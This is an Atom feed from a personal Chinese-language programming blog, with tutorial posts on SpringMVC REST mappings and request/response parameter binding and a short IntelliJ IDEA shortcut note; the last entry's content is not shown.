<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Code Play</title>
  <icon>https://www.gravatar.com/avatar/37f5042e32043c8bcdfe0a7b75ed5267</icon>
  <subtitle>Codes&#39; Playground</subtitle>
  <link href="https://kallenblue.github.io/atom.xml" rel="self"/>
  
  <link href="https://kallenblue.github.io/"/>
  <updated>2022-10-04T16:00:06.434Z</updated>
  <id>https://kallenblue.github.io/</id>
  
  <author>
    <name>南懿烨曦</name>
    <email>869083577@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SpringMVC-REST</title>
    <link href="https://kallenblue.github.io/2022/10/04/SpringMVC/SpringMVC-REST/"/>
    <id>https://kallenblue.github.io/2022/10/04/SpringMVC/SpringMVC-REST/</id>
    <published>2022-10-04T14:37:04.000Z</published>
    <updated>2022-10-04T16:00:06.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="REST简介"><a href="#REST简介" class="headerlink" title="REST简介"></a>REST简介</h1><ul><li>REST(Representational State Transfer)，表现形式状态转换<ul><li>传统风格资源描述形式<ul><li><a href="http://localhost/user/getById?id=1">http://localhost/user/getById?id=1</a></li><li><a href="http://localhost/user/saveUser">http://localhost/user/saveUser</a></li></ul></li><li>REST风格<ul><li><a href="http://localhost/user/1">http://localhost/user/1</a></li><li><a href="http://localhost/user">http://localhost/user</a></li></ul></li></ul></li><li>优点：<ul><li>隐藏资源的访问行为，无法通过地址得知对资源是何种操作</li><li>书写简化</li></ul></li></ul><h2 id="REST风格简介"><a href="#REST风格简介" class="headerlink" title="REST风格简介"></a>REST风格简介</h2><ul><li><p>按照REST风格访问资源时使用行为动作区分对资源进行了何种操作</p><ul><li><a href="http://localhost/users">http://localhost/users</a> &nbsp;&nbsp;&nbsp;查询全部用户信息    GET（查询）</li><li><a href="http://localhost/users/1">http://localhost/users/1</a> 查询指定用户信息    GET（查询）</li><li><a href="http://localhost/users">http://localhost/users</a> &nbsp;&nbsp;&nbsp;添加用户信息 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;POST（新增/保存）</li><li><a href="http://localhost/users">http://localhost/users</a> &nbsp;&nbsp;&nbsp;修改用户信息 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PUT（修改/更新）</li><li><a href="http://localhost/users/1">http://localhost/users/1</a>    删除用户信息 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DELETE（删除）</li></ul></li><li><p>根据REST风格对资源进行访问称为<strong>RESTful</strong></p></li></ul><h2 id="REST风格案例"><a href="#REST风格案例" class="headerlink" title="REST风格案例"></a>REST风格案例</h2><ul><li>设定http请求动作</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(method = RequestMethod.POST)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;user save...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>设定请求参数（路径变量）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/&#123;id&#125;&quot;, method = RequestMethod.DELETE)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">delete</span><span class="params">(<span class="meta">@PathVariable</span> <span class="type">int</span> id)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;user delete...&quot;</span>+id);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>@RequestBody @RequestParam @PathVariable<blockquote><p>@RequestParam 用于接收url地址传参或表单传参（非json格式时使用）</p></blockquote></li></ul><blockquote><p>@RequestBody用于接收json数据（应用最广泛）</p></blockquote><blockquote><p>@PathVariable用于接收路径参数，使用{参数名称}描述路径参数（参数较少时使用）</p></blockquote><h1 id="简化REST"><a href="#简化REST" class="headerlink" title="简化REST"></a>简化REST</h1><ul><li>@RestController替代@Controller @ResponseBody<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@Controller</span></span><br><span class="line"><span class="comment">//@ResponseBody</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>@GetMapping @PostMapping @PutMapping @DeleteMapping替换普通的@RequestMapping</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  @RequestMapping(method = RequestMethod.POST)</span></span><br><span class="line">  <span class="meta">@PostMapping</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  @RequestMapping(value = &quot;/&#123;id&#125;&quot;, method = RequestMethod.DELETE)</span></span><br><span class="line">  <span class="meta">@DeleteMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">delete</span><span class="params">(<span class="meta">@PathVariable</span> <span class="type">int</span> id)</span>&#123;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="补充：对静态页面的放行"><a href="#补充：对静态页面的放行" class="headerlink" title="补充：对静态页面的放行"></a>补充：对静态页面的放行</h1><blockquote><p>新建一个配置类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcSupport</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurationSupport</span> &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> &#123;</span><br><span class="line">    registry.addResourceHandler(<span class="string">&quot;/pages/**&quot;</span>).addResourceLocations(<span class="string">&quot;/pages/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;REST简介&quot;&gt;&lt;a href=&quot;#REST简介&quot; class=&quot;headerlink&quot; title=&quot;REST简介&quot;&gt;&lt;/a&gt;REST简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;REST(Representational State Transfer)，表现形式状态转换&lt;u</summary>
      
    
    
    
    <category term="SpringMVC" scheme="https://kallenblue.github.io/categories/SpringMVC/"/>
    
    
    <category term="REST" scheme="https://kallenblue.github.io/tags/REST/"/>
    
  </entry>
  
  <entry>
    <title>idea快捷键记录</title>
    <link href="https://kallenblue.github.io/2022/10/04/%E5%A4%87%E5%BF%98/idea%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/"/>
    <id>https://kallenblue.github.io/2022/10/04/%E5%A4%87%E5%BF%98/idea%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/</id>
    <published>2022-10-04T06:14:21.000Z</published>
    <updated>2022-10-04T14:28:30.466Z</updated>
    
    <content type="html"><![CDATA[<ul><li>查找类<blockquote><p>ctrl+n</p></blockquote></li><li>查看类的层次结构<blockquote><p>ctrl+h</p></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;查找类&lt;blockquote&gt;
&lt;p&gt;ctrl+n&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;查看类的层次结构&lt;blockquote&gt;
&lt;p&gt;ctrl+h&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
</summary>
      
    
    
    
    <category term="备忘" scheme="https://kallenblue.github.io/categories/%E5%A4%87%E5%BF%98/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringMVC-请求与响应</title>
    <link href="https://kallenblue.github.io/2022/10/04/SpringMVC/SpringMVC-%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94/"/>
    <id>https://kallenblue.github.io/2022/10/04/SpringMVC/SpringMVC-%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94/</id>
    <published>2022-10-04T03:46:08.000Z</published>
    <updated>2022-10-04T06:19:41.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h1><h2 id="请求映射路径"><a href="#请求映射路径" class="headerlink" title="请求映射路径"></a>请求映射路径</h2><ul><li>@RequestMapping</li><li>设置当前控制器方法请求访问路径，如果设置在类上统一设置当前控制器方法请求访问路径前缀</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@RequestMapping(&quot;/save&quot;)</span></span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;user save...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@RequestMapping(&quot;/delete&quot;)</span></span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">delete</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;delete save...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="get和post请求"><a href="#get和post请求" class="headerlink" title="get和post请求"></a>get和post请求</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;name--&gt;&quot;</span>+name);</span><br><span class="line">  System.out.println(<span class="string">&quot;age--&gt;&quot;</span>+age);</span><br><span class="line">  System.out.println(<span class="string">&quot;user test...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>get和post通用</p></blockquote><h3 id="乱码问题"><a href="#乱码问题" class="headerlink" title="乱码问题"></a>乱码问题</h3><ul><li>为web容器添加过滤器并指定字符集，Spring-web包中提供了专用的字符过滤器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletContainersInitConfig</span> <span class="keyword">extends</span></span><br><span class="line">    <span class="title class_">AbstractAnnotationConfigDispatcherServletInitializer</span> &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> Filter[] getServletFilters() &#123;</span><br><span class="line">    <span class="type">CharacterEncodingFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharacterEncodingFilter</span>();</span><br><span class="line">    filter.setEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Filter</span>[]&#123;filter&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>仅作用于post方法，但是好像新版的tomcat已经自动解决了get方法</p></blockquote><h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><h3 id="普通参数"><a href="#普通参数" class="headerlink" title="普通参数"></a>普通参数</h3><blockquote><p>上一栏已经演示，不再赘述，加一点：如果请求参数名与形参变量名不同，使用@RequestParam绑定参数关系</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(&quot;name&quot;)</span> String username,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;name--&gt;&quot;</span>+username);</span><br><span class="line">  System.out.println(<span class="string">&quot;age--&gt;&quot;</span>+age);</span><br><span class="line">  System.out.println(<span class="string">&quot;user test...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="POJO参数"><a href="#POJO参数" class="headerlink" title="POJO参数"></a>POJO参数</h3><blockquote><p>请求参数名与形参对象属性名相同，定义POJO类型形参即可接收参数</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(User user)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;name--&gt;&quot;</span>+user.getName());</span><br><span class="line">  System.out.println(<span class="string">&quot;age--&gt;&quot;</span>+user.getAge());</span><br><span class="line">  System.out.println(<span class="string">&quot;user test...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="嵌套POJO参数"><a href="#嵌套POJO参数" class="headerlink" title="嵌套POJO参数"></a>嵌套POJO参数</h3><blockquote><p>请求参数名与形参对象属性名相同，按照对象层次结构关系即可接收嵌套POJO属性参数</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String city;</span><br><span class="line">  <span class="keyword">private</span> String province;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/1270566a-30bf-4d1a-b533-fdeac7737d84.png"></p><h3 id="数组参数"><a href="#数组参数" class="headerlink" title="数组参数"></a>数组参数</h3><blockquote><p>请求参数名与形参对象属性名相同且请求参数为多个，定义数组类型形参即可接收参数</p></blockquote><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/26e8451f-78ed-4c2f-b293-5c56eb58a3de.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(String[] likes)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;likes--&gt;&quot;</span>+likes);</span><br><span class="line">  System.out.println(<span class="string">&quot;user test...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="集合保存普通参数"><a href="#集合保存普通参数" class="headerlink" title="集合保存普通参数"></a>集合保存普通参数</h3><blockquote><p>请求参数名与形参对象属性名相同且请求参数为多个，@RequestParam绑定参数关系</p></blockquote><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/26e8451f-78ed-4c2f-b293-5c56eb58a3de.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam</span> List&lt;String&gt; likes)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;likes--&gt;&quot;</span>+likes);</span><br><span class="line">  System.out.println(<span class="string">&quot;user test...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="json数据传递"><a href="#json数据传递" class="headerlink" title="json数据传递"></a>json数据传递</h3><ul><li>添加json数据转换相关坐标</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>开启自动转换json数据的支持@EnableWebMvc<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.kallen.controller&quot;)</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcConfig</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>@EnableWebMvc开启SpringMVC多项辅助功能</p></blockquote></li></ul><blockquote><p>@EnableWebMvc注解功能强大，该注解整合了多个功能，此处仅使用其中一部分功能，即json数据进行自动类型转换</p></blockquote><ul><li>设置接收json数据@RequestBody</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestBody</span> String[] likes)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;likes--&gt;&quot;</span>+likes);</span><br><span class="line">  System.out.println(<span class="string">&quot;user test...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RequestBody与-RequestParam区别"><a href="#RequestBody与-RequestParam区别" class="headerlink" title="@RequestBody与@RequestParam区别"></a>@RequestBody与@RequestParam区别</h4><ul><li>区别<ul><li>@RequestParam用于接收url地址传参</li><li>@RequestBody用于接收json数据</li></ul></li><li>应用<ul><li>后期开发中，发送json格式数据为主，@RequestBody应用较广</li><li>如果发送非json格式数据，选用@RequestParam接收请求参数</li></ul></li></ul><h3 id="日期型参数传递"><a href="#日期型参数传递" class="headerlink" title="日期型参数传递"></a>日期型参数传递</h3><ul><li>日期型数据基于系统不同格式也不尽相同<ul><li>2088-08-18</li><li>2088/08/18</li><li>08/18/2088</li></ul></li><li>接收形参时，根据不同的日期格式设置不同观点接收方式</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(Date date1,</span></span><br><span class="line"><span class="params">                   <span class="meta">@DateTimeFormat(pattern = &quot;yyyy-MMM-dd&quot;)</span> Date date2,</span></span><br><span class="line"><span class="params">                   <span class="meta">@DateTimeFormat(pattern = &quot;yyyy/MM/dd HH:mm:ss&quot;)</span> Date date3)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;date1--&gt;&quot;</span>+date1);</span><br><span class="line">  System.out.println(<span class="string">&quot;date2--&gt;&quot;</span>+date2);</span><br><span class="line">  System.out.println(<span class="string">&quot;date3--&gt;&quot;</span>+date3);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&#123;&#x27;data&#x27;:&#x27;success&#x27;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>@DateTimeFormat设定日期时间型数据格式</p></blockquote><blockquote><p>@EnableWebMvc功能之一：根据类型匹配对应的类型转换器</p></blockquote><h1 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h1><ul><li>@ResponseBody：设置当前控制器返回值作为响应体<blockquote><p>返回为json数据依赖于</p></blockquote></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>测试类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">test</span><span class="params">(User user)</span>&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;user--&gt;&quot;</span>+user);</span><br><span class="line">  <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>响应结果</p></blockquote><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/4a473cb9-c785-48c2-9401-5b6c0f31943f.png"></p><blockquote><p>转换依靠HttpMessageConverter接口</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HttpMessageConverter</span>&lt;T&gt; &#123;</span><br><span class="line"><span class="type">boolean</span> <span class="title function_">canRead</span><span class="params">(Class&lt;?&gt; clazz, <span class="meta">@Nullable</span> MediaType mediaType)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">canWrite</span><span class="params">(Class&lt;?&gt; clazz, <span class="meta">@Nullable</span> MediaType mediaType)</span>;</span><br><span class="line"></span><br><span class="line">List&lt;MediaType&gt; <span class="title function_">getSupportedMediaTypes</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">T <span class="title function_">read</span><span class="params">(Class&lt;? extends T&gt; clazz, HttpInputMessage inputMessage)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, HttpMessageNotReadableException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">write</span><span class="params">(T t, <span class="meta">@Nullable</span> MediaType contentType, HttpOutputMessage outputMessage)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, HttpMessageNotWritableException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;请求&quot;&gt;&lt;a href=&quot;#请求&quot; class=&quot;headerlink&quot; title=&quot;请求&quot;&gt;&lt;/a&gt;请求&lt;/h1&gt;&lt;h2 id=&quot;请求映射路径&quot;&gt;&lt;a href=&quot;#请求映射路径&quot; class=&quot;headerlink&quot; title=&quot;请求映射路径&quot;&gt;&lt;/a&gt;请</summary>
      
    
    
    
    <category term="SpringMVC" scheme="https://kallenblue.github.io/categories/SpringMVC/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringMVC-启动一个SpringMVC项目</title>
    <link href="https://kallenblue.github.io/2022/10/03/SpringMVC/SpringMVC-%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AASpringMVC%E9%A1%B9%E7%9B%AE/"/>
    <id>https://kallenblue.github.io/2022/10/03/SpringMVC/SpringMVC-%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AASpringMVC%E9%A1%B9%E7%9B%AE/</id>
    <published>2022-10-03T13:10:26.000Z</published>
    <updated>2022-10-04T04:06:22.842Z</updated>
    
